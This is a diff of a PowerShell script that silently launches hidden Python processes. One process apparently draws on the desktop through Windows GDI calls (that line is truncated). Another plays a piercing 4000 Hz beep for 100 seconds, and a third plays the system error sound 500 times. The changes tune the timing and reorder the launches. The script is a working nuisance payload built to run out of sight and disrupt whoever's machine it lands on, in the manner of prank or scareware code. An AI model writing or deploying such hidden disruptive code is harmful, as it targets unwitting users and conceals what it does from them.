@@ -2,7 +2,7 @@ $screenCode = 'import ctypes as c;g=c.windll.gdi32;u=c.windll.user32;d=u.GetDC(0
 
 $beepCode = 'import winsound;winsound.Beep(4000,100000)'
 
-$soundCode = 'import winsound,time;exec(''for _ in range(500):\n winsound.PlaySound("SystemHand",winsound.SND_ALIAS)\n time.sleep(0.05)'')'
+$soundCode = 'import winsound,time;exec(''for _ in range(500):\n winsound.PlaySound("SystemHand",winsound.SND_ALIAS)\n time.sleep(0.5)'')'
 
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
     '-NoProfile'
@@ -12,15 +12,17 @@ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
 
 Start-Process python.exe -WindowStyle Hidden -ArgumentList @(
     '-c'
-    $screenCode
-)
-
-Start-Process python.exe -WindowStyle Hidden -ArgumentList @(
-    '-c'
     $beepCode
 )
+
+Start-Sleep -Milliseconds 300
 
 Start-Process python.exe -WindowStyle Hidden -ArgumentList @(
     '-c'
     $soundCode
+)
+
+Start-Process python.exe -WindowStyle Hidden -ArgumentList @(
+    '-c'
+    $screenCode
 )
